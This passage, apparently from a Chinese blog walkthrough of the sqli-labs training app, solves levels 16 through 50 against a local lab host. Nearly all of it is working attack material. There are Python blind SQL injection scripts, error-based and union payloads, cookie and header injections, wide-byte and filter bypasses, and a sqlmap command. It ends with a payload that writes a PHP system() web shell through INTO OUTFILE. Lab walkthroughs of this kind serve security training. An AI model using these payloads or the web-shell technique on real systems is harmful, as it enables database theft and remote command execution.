class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.39/sqli/Less-16/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_2</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span>  <span class="comment"># 使用可打印的ASCII范围32到127</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            mid = (start + end) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;uname&quot;</span>: <span class="string">f&#x27;adm&quot;) or if(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)-- -&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = session.post(url, data=data)</span><br><span class="line">            <span class="comment"># print(response.text)</span></span><br><span class="line">            <span class="comment"># print(len(response.text))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;flag.jpg&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="comment"># 如果内容大于某个长度，假设SQL条件为真</span></span><br><span class="line">                start = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">            <span class="comment"># 调试输出来理解过程</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;测试位置 <span class="subst">&#123;i&#125;</span>, 字符ASCII: <span class="subst">&#123;mid&#125;</span>, start = <span class="subst">&#123;start&#125;</span>, end = <span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 循环结束后需要重新设置mid点</span></span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        found_char = <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span>:  <span class="comment"># 如果ASCII是32（空格），可能表示结束</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        name += found_char</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;找到的字符: <span class="subst">&#123;found_char&#125;</span>, 目前的数据库名称: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;最终数据库名称: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db_2()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h3><p>利用yakit抓包,并输入下列这句话<code>uname=admin&amp;passwd=a&#39; or (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -&amp;submit=Submit</code></p>
+<h3 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h3><p>   在ua头后插入后面这句话<code>1&#39;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;</code></p>
+<h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关:"></a>第十九关:</h3><p>在referer后插入这句话<code>1&#39;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;</code></p>
+<h3 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h3><p>用yakit抓cookie的包并修改cookie值如下列语句<code>Cookie: uname=admin&#39; and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</code></p>
+<h3 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关:"></a>第二十一关:</h3><p>闭合点为‘），将cookie值要传入的代码base64编码后再替换成下列这句话<code>Cookie: uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpKS0tIC0=</code></p>
+<h3 id="第二十二关："><a href="#第二十二关：" class="headerlink" title="第二十二关："></a>第二十二关：</h3><p>闭合点为“，将cookie值要传入的代码base64编码后再替换成下列这句话<code>Cookie: uname=YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IHVzZXIoKSksMHg3ZSkpLS0gLQ==</code></p>
+<h3 id="第二十三关："><a href="#第二十三关：" class="headerlink" title="第二十三关："></a>第二十三关：</h3><p>利用HackBar修改为下列语句<code>http://192.168.2.39/sqli/Less-23/?id=-1&#39; union select 1,database(),&#39;3</code></p>
+<h3 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关:"></a>第二十四关:</h3><p>先注册一个带有注入语句的代码，创建admin’– -账号，再对admin’– -账号进行修改密码，修改后的密码就是admin的密码</p>
+<p>Sql 语句变为 UPDATE users SET passwd&#x3D;”New_Pass” WHERE username &#x3D;’ admin’ # ‘ AND<br>password&#x3D;’ ， 也 就 是 执 行 了 UPDATE users SET passwd&#x3D;”New_Pass” WHERE username &#x3D;’ admin’</p>
+<h3 id="第二十五关（or过滤）："><a href="#第二十五关（or过滤）：" class="headerlink" title="第二十五关（or过滤）："></a>第二十五关（or过滤）：</h3><p>利用HackBar传入下面这句话<code>http://192.168.2.39/sqli/Less-25/?id=1&#39; || extractvalue(1,concat(0x7e,(select user()),0x7e))-- -</code></p>
+<p>本关主要为 or and 过滤，如何绕过 or 和 and 过滤。一般性提供以下几种思路：<br>（1）大小写变形 Or,OR,oR<br>（2）编码，hex，urlencode<br>（3）添加注释&#x2F;<em>or</em>&#x2F;<br>（4）利用符号 and&#x3D;&amp;&amp; or&#x3D;|</p>
+<h3 id="第二十六关："><a href="#第二十六关：" class="headerlink" title="第二十六关："></a>第二十六关：</h3><p>通过源码找到发现过滤规则，过滤规则如下</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>找到闭合语句，闭合语句如下<code>http://192.168.2.39/sqli/Less-26/?id=-1%27||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||%271%27=%271</code> 进行爆库操作</p>
+<h3 id="二十六a："><a href="#二十六a：" class="headerlink" title="二十六a："></a>二十六a：</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.39/sqli/Less-26a/?id=0&#x27;)&quot;</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">    start=<span class="number">31</span></span><br><span class="line">    end=<span class="number">128</span></span><br><span class="line">    temp=start+end//<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">150</span>):</span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))=0||(&#x27;0&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            i=-<span class="number">10</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;||(&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(temp),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;||(&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            start=temp</span><br><span class="line">            temp=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))&lt;&#123;1&#125;||(&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            end=temp</span><br><span class="line">            temp=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="二十七关："><a href="#二十七关：" class="headerlink" title="二十七关："></a>二十七关：</h3><p>利用盲注脚本</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.39/sqli/Less-27/?id=0&#x27;&quot;</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">    start=<span class="number">31</span></span><br><span class="line">    end=<span class="number">128</span></span><br><span class="line">    temp=start+end//<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">150</span>):</span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))=0||&#x27;0&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            i=-<span class="number">10</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;||&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(temp),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;||&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            start=temp</span><br><span class="line">            temp=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))&lt;&#123;1&#125;||&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            end=temp</span><br><span class="line">            temp=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="第二十八关："><a href="#第二十八关：" class="headerlink" title="第二十八关："></a>第二十八关：</h3><p>用盲注脚本</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.39/sqli/Less-28/?id=0&#x27;&quot;</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">    start=<span class="number">31</span></span><br><span class="line">    end=<span class="number">128</span></span><br><span class="line">    temp=start+end//<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">150</span>):</span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))=0||&#x27;0&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            i=-<span class="number">10</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;||&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(temp),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;||&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            start=temp</span><br><span class="line">            temp=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))&lt;&#123;1&#125;||&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            end=temp</span><br><span class="line">            temp=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h3 id="二十九关（http参数污染）"><a href="#二十九关（http参数污染）" class="headerlink" title="二十九关（http参数污染）"></a>二十九关（http参数污染）</h3><p>用盲注脚本</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.39/sqli/Less-28/?id=0&#x27;&quot;</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">    start=<span class="number">31</span></span><br><span class="line">    end=<span class="number">128</span></span><br><span class="line">    temp=start+end//<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">150</span>):</span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))=0||&#x27;0&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            i=-<span class="number">10</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;||&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(temp),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;||&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            start=temp</span><br><span class="line">            temp=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        paramGet = url+ <span class="string">&quot;||ascii(substr(database(),&#123;0&#125;,1))&lt;&#123;1&#125;||&#x27;0&quot;</span>.<span class="built_in">format</span>(i,temp)</span><br><span class="line">        response = requests.get(paramGet)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            end=temp</span><br><span class="line">            temp=(start+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="第三十关："><a href="#第三十关：" class="headerlink" title="第三十关："></a>第三十关：</h3><p>和二十九关一样是http污染，利用hackbar传入下面这句话<code>http://192.168.2.39/sqli/Less-30/?id=1&amp;&amp;id=0&quot; union select 1,2,database()-- -</code></p>
+<h3 id="第三十一关："><a href="#第三十一关：" class="headerlink" title="第三十一关："></a>第三十一关：</h3><p>http污染，利用hackbar传入下面这句话<code>http://192.168.2.39/sqli/Less-31/?id=1&amp;id=0&quot;) union select 1,2,database()-- -</code></p>
+<h3 id="第三十二关（宽字节符）："><a href="#第三十二关（宽字节符）：" class="headerlink" title="第三十二关（宽字节符）："></a>第三十二关（宽字节符）：</h3><p><code>?id=1%df&#39; and 1=1--+</code>判断是否是宽字节符</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/liuweisongg/picture@main//imgKuanZiJie.PNG"
+                     
+                ></p>
+<p>判断是宽字节符后用HackBar写入下面这句话<code>http://192.168.2.39/sqli/Less-32/?id=0%df&#39; union select 1,database(),3-- - </code></p>
+<h3 id="第三十三关："><a href="#第三十三关：" class="headerlink" title="第三十三关："></a>第三十三关：</h3><p>同样是宽字节符注入，利用hackbar写入下面这句话<code>http://192.168.2.39/sqli/Less-33/?id=0%df&#39; union select 1,2,database()-- -</code></p>
+<h3 id="第三十四关："><a href="#第三十四关：" class="headerlink" title="第三十四关："></a>第三十四关：</h3><p>因为是post提交不能使用url编码，但是可以使用十六进制编码绕过，但是需要使用三个字节，最好的<br>办法是是使用汉字(一些汉字是三个字节的就可以将后面的\消耗)</p>
+<p>在账号框注入<code>安徽的哈&#39; or (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- -&#39;</code></p>
+<h3 id="第三十五关："><a href="#第三十五关：" class="headerlink" title="第三十五关："></a>第三十五关：</h3><p>审查源码发现id&#x3D;$id</p>
+<p>利用hackbar写入下面这句话<code>http://192.168.2.39/sqli/Less-35/?id=0 union select 1,database(),3-- -</code></p>
+<h3 id="第三十六关："><a href="#第三十六关：" class="headerlink" title="第三十六关："></a>第三十六关：</h3><p>审查源码发现id&#x3D;’$id’ ，利用宽字节符注入</p>
+<p>利用hackbar写入下面这句话<code>http://192.168.2.39/sqli/Less-36/?id=0%df&#39; union select 1,database(),3-- -</code></p>
+<h3 id="第三十七关："><a href="#第三十七关：" class="headerlink" title="第三十七关："></a>第三十七关：</h3><p>先输入ad’发现被转义，使用汉字进行占位转义</p>
+<p>在username框中输入下面这句话<code>很大很大哈\&#39; or (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -</code></p>
+<h3 id="第三十八关-可以堆叠注入-："><a href="#第三十八关-可以堆叠注入-：" class="headerlink" title="第三十八关(可以堆叠注入)："></a>第三十八关(可以堆叠注入)：</h3><p>mysqli_multi_query()这个函数可以实现针对数据库一条或多多条数据的操作，这就导致可能产生堆叠<br>注入的存在，堆叠注入的危害比普通爆破更为强烈,可以实现数据的增删改查，木马的写入，甚至直接破<br>环升格数据库</p>
+<p>利用hackbar写入下面这句话<code>http://192.168.2.39/sqli/Less-38/?id=0&#39; union select 1,database(),3-- -</code></p>
+<h3 id="第三十九关："><a href="#第三十九关：" class="headerlink" title="第三十九关："></a>第三十九关：</h3><p>审查源码发现没有闭合，直接注入，用hackbar写入下列语句<code>http://192.168.2.39/sqli/Less-39/?id=0 union select 1,2,database() -- -</code></p>
+<h3 id="第四十关"><a href="#第四十关" class="headerlink" title="第四十关:"></a>第四十关:</h3><p>审查源码发现闭合为‘），用hackbar写入下列语句<code>http://192.168.2.39/sqli/Less-40/?id=0&#39;) union select 1,2,database()-- -</code></p>
+<h3 id="第四十一关："><a href="#第四十一关：" class="headerlink" title="第四十一关："></a>第四十一关：</h3><p>审查源码发现没有闭合，直接利用hackbar写入下列语句<code>http://192.168.2.39/sqli/Less-41/?id=0 union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database()-- -</code></p>
+<h3 id="第四十二关："><a href="#第四十二关：" class="headerlink" title="第四十二关："></a>第四十二关：</h3><p>审查源码发现 ‘ 闭合，username框有处理，在密码框用 a’ union select 1,2,database()– -爆出库名  </p>
+<h3 id="第四十三关："><a href="#第四十三关：" class="headerlink" title="第四十三关："></a>第四十三关：</h3><p>审查源码发现 ‘）闭合，在密码框用 a’ union select 1,database(),3– -爆出库名</p>
+<h3 id="第四十四关："><a href="#第四十四关：" class="headerlink" title="第四十四关："></a>第四十四关：</h3><p>审查源码发现 ’ 闭合，在密码框输入 a’ union select 1,database(),3– -爆出库名</p>
+<h3 id="第四十五关："><a href="#第四十五关：" class="headerlink" title="第四十五关："></a>第四十五关：</h3><p>审查源码发现 ‘）闭合，在密码框用 a’ union select 1,database(),3– -爆出库名</p>
+<h3 id="第四十六关："><a href="#第四十六关：" class="headerlink" title="第四十六关："></a>第四十六关：</h3><p>拼接报错语句<code>http://192.168.2.39/sqli/Less-46/?sort=0 and updatexml(1,concat(0x7e,(select user()),0x7e),1)-- -</code></p>
+<h3 id="第四十七关"><a href="#第四十七关" class="headerlink" title="第四十七关;"></a>第四十七关;</h3><p>审查源码发现闭合为 ‘ ，在拼接报错语句<code>http://192.168.2.39/sqli/Less-47/?sort=0&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)-- -</code></p>
+<h3 id="第四十八关"><a href="#第四十八关" class="headerlink" title="第四十八关:"></a>第四十八关:</h3><p>sqlmap直接梭哈</p>
+<h3 id="第四十九关："><a href="#第四十九关：" class="headerlink" title="第四十九关："></a>第四十九关：</h3><p>sqlmap直接梭哈 <code>sqlmap -u &quot;&quot;-v 3 --dbs</code></p>
+<h3 id="第五十关："><a href="#第五十关：" class="headerlink" title="第五十关："></a>第五十关：</h3><h2 id="4-webshell"><a href="#4-webshell" class="headerlink" title="4.webshell"></a>4.webshell</h2><ul>
+<li>在phpstudy的设置中查找配置文件，修改mysql.ini添加secure_file_priv&#x3D;””</li>
+<li>?id&#x3D;-1’ union select 1,@@datadir,@@secure_file_priv – - 在HackBar中写入这句话</li>
+<li><code>?id=-1&#39; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]);  ?&gt;&quot; into outfile &quot;C:\\phpstudy_pro\\WWW\\phpinfo.php&quot; -- -</code> 网站传入这句话得到webshell</li>
+</ul>
+<h2 id="5-宽字节符注入："><a href="#5-宽字节符注入：" class="headerlink" title="5.宽字节符注入："></a>5.宽字节符注入：</h2><p>使用%df与转义的&#x2F;拼接，通过gbk编码转换成一个字，从而绕过&#x2F;转义</p>
